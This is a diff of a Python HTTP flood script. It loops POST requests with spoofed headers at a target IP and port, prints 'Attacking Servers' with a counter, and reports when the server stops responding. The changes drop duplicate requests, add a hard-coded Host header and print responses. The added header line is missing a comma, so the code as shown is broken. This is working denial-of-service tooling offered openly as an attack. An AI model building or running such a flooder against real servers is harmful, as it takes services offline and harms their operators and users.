@@ -57,17 +57,16 @@ while True:
                 "Connection": "Keep-Alive",
                 "Referer": f"{res}",
                 "Cache-Control": "no-store, no-cache"
+                "Host": "192.167.1.5"
             }
             response = requests.post(url, headers=headers)
-            response = requests.post(url, headers=headers)
-            response = requests.post(url, headers=headers)
-            response = requests.post(url, headers=headers)
             print(f"{red}Attacking {yellow}Servers{red} At{blue} {ip} {red}Port {blue}{port} : {white}", counter)
+            print(response)
         except KeyboardInterrupt:
             print("KeyboardInterrupt")
             exit()
         except requests.exceptions.MissingSchema:
             print(red + f"Error While Attacking.. Did you write the Targets URL correctly?")
             exit()
-    print(blue + f"[ + ] The Servers Just Stopped Responding.. [ + ]")
+    print(green + f"[ + ] The Server Just Stopped Responding.. [ + ]")
     
